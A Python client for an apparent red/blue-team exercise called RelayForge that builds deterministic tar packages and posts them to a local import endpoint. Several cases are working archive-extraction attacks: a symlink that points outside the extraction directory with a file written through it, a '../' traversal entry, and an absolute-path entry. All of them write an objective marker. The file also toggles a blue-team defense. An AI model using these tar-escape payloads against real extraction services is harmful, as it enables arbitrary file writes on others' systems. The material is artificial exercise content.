#!/usr/bin/env python3
"""Deterministic RF-A package builders and Docker reference client."""

from __future__ import annotations

import argparse
import base64
import hashlib
import io
import json
import tarfile
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Iterable

PACKAGE_SCHEMA = "battle.v16.relayforge.package.v1"
RF_A_OBJECTIVE_BYTES = (
    json.dumps(
        {
            "schema": "battle.v16.relayforge.rf_a_objective.v1",
            "state": "RF_A_OBJECTIVE_REACHED",
        },
        sort_keys=True,
        separators=(",", ":"),
    )
    + "\n"
).encode("utf-8")


@dataclass(frozen=True)
class TarEntry:
    name: str
    kind: str
    body: bytes = b""
    linkname: str = ""


def _info(name: str) -> tarfile.TarInfo:
    info = tarfile.TarInfo(name=name)
    info.uid = 0
    info.gid = 0
    info.uname = "root"
    info.gname = "root"
    info.mtime = 0
    info.mode = 0o755
    return info


def deterministic_tar(entries: Iterable[TarEntry]) -> bytes:
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w", format=tarfile.USTAR_FORMAT) as archive:
        for entry in entries:
            info = _info(entry.name)
            if entry.kind == "directory":
                info.type = tarfile.DIRTYPE
                info.size = 0
                archive.addfile(info)
            elif entry.kind == "symlink":
                info.type = tarfile.SYMTYPE
                info.linkname = entry.linkname
                info.size = 0
                archive.addfile(info)
            elif entry.kind == "regular":
                info.type = tarfile.REGTYPE
                info.mode = 0o644
                info.size = len(entry.body)
                archive.addfile(info, io.BytesIO(entry.body))
            else:
                raise ValueError(f"unsupported deterministic tar entry kind: {entry.kind}")
    return stream.getvalue()


def package_envelope(
    *, request_id: str, tenant_id: str, archive: bytes, package_name: str
) -> dict[str, str]:
    return {
        "schema": PACKAGE_SCHEMA,
        "request_id": request_id,
        "tenant_id": tenant_id,
        "package_name": package_name,
        "archive_sha256": hashlib.sha256(archive).hexdigest(),
        "archive_b64": base64.b64encode(archive).decode("ascii"),
    }


def regular_package(
    *, request_id: str = "rf-a-regular", tenant_id: str = "tenant-red"
) -> dict[str, str]:
    archive = deterministic_tar(
        [
            TarEntry("payload", "directory"),
            TarEntry("payload/readme.txt", "regular", b"relayforge regular package\n"),
        ]
    )
    return package_envelope(
        request_id=request_id,
        tenant_id=tenant_id,
        archive=archive,
        package_name="regular.tar",
    )


def inbound_transformed_package(
    *, request_id: str = "rf-a-inbound", tenant_id: str = "tenant-red"
) -> dict[str, str]:
    archive = deterministic_tar(
        [
            TarEntry("safe-target", "directory"),
            TarEntry("assets", "directory"),
            TarEntry("assets/alias", "symlink", linkname="../safe-target"),
            TarEntry(
                "assets/alias/inside.txt",
                "regular",
                b"relayforge in-bound transformed object\n",
            ),
        ]
    )
    return package_envelope(
        request_id=request_id,
        tenant_id=tenant_id,
        archive=archive,
        package_name="inbound-transformed.tar",
    )


def exploit_package(
    *,
    request_id: str = "rf-a-reference",
    tenant_id: str = "tenant-red",
    rf_a_target: str = "/var/lib/relayforge/sinks/rf-a",
) -> dict[str, str]:
    archive = deterministic_tar(
        [
            TarEntry("payload/readme.txt", "regular", b"valid package marker\n"),
            TarEntry("assets", "directory"),
            TarEntry(
                "assets/alias",
                "symlink",
                linkname=rf_a_target,
            ),
            TarEntry("assets/alias/objective.txt", "regular", RF_A_OBJECTIVE_BYTES),
        ]
    )
    return package_envelope(
        request_id=request_id,
        tenant_id=tenant_id,
        archive=archive,
        package_name="rf-a-reference.tar",
    )


def malformed_name_package(
    *, request_id: str = "rf-a-malformed", tenant_id: str = "tenant-red"
) -> dict[str, str]:
    archive = deterministic_tar(
        [TarEntry("../rf-a/objective.txt", "regular", RF_A_OBJECTIVE_BYTES)]
    )
    return package_envelope(
        request_id=request_id,
        tenant_id=tenant_id,
        archive=archive,
        package_name="malformed-name.tar",
    )


def absolute_name_package(
    *, request_id: str = "rf-a-absolute", tenant_id: str = "tenant-red"
) -> dict[str, str]:
    archive = deterministic_tar(
        [
            TarEntry(
                "/var/lib/relayforge/sinks/rf-a/objective.txt",
                "regular",
                RF_A_OBJECTIVE_BYTES,
            )
        ]
    )
    return package_envelope(
        request_id=request_id,
        tenant_id=tenant_id,
        archive=archive,
        package_name="absolute-name.tar",
    )


def non_rfa_escape_package(
    *, request_id: str = "rf-a-non-rfa", tenant_id: str = "tenant-red"
) -> dict[str, str]:
    archive = deterministic_tar(
        [
            TarEntry("payload/readme.txt", "regular", b"valid package marker\n"),
            TarEntry("assets", "directory"),
            TarEntry("assets/alias", "symlink", linkname="/tmp/relayforge-shortcut"),
            TarEntry("assets/alias/objective.txt", "regular", RF_A_OBJECTIVE_BYTES),
        ]
    )
    return package_envelope(
        request_id=request_id,
        tenant_id=tenant_id,
        archive=archive,
        package_name="non-rfa-escape.tar",
    )


CASES = {
    "regular": regular_package,
    "inbound": inbound_transformed_package,
    "exploit": exploit_package,
    "malformed": malformed_name_package,
    "absolute": absolute_name_package,
    "non-rfa": non_rfa_escape_package,
}


def _post(url: str, value: dict[str, object], headers: dict[str, str] | None = None) -> tuple[int, dict[str, object]]:
    body = json.dumps(value, sort_keys=True, separators=(",", ":")).encode("utf-8")
    request_headers = {"content-type": "application/json", **(headers or {})}
    request = urllib.request.Request(url, data=body, headers=request_headers, method="POST")
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            return int(response.status), json.loads(response.read().decode("utf-8"))
    except urllib.error.HTTPError as exc:
        return int(exc.code), json.loads(exc.read().decode("utf-8"))


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--case", choices=sorted(CASES), default="exploit")
    parser.add_argument("--request-id")
    parser.add_argument("--tenant-id", default="tenant-red")
    parser.add_argument("--defense", choices=("on", "off"))
    args = parser.parse_args()

    if args.defense is not None:
        status, payload = _post(
            f"{args.base_url}/api/v1/defenses/extractor-object-identity",
            {"enabled": args.defense == "on"},
            {"x-relayforge-team": "blue"},
        )
        print(json.dumps({"defense_status": status, "defense": payload}, sort_keys=True))
        if status != 200:
            return 1

    builder = CASES[args.case]
    kwargs = {"tenant_id": args.tenant_id}
    if args.request_id:
        kwargs["request_id"] = args.request_id
    package = builder(**kwargs)
    status, payload = _post(
        f"{args.base_url}/api/v1/jobs/import",
        package,
        {"x-relayforge-tenant": args.tenant_id},
    )
    print(json.dumps({"http_status": status, "response": payload}, indent=2, sort_keys=True))
    return 0 if status in {201, 409, 422} else 1


if __name__ == "__main__":
    raise SystemExit(main())
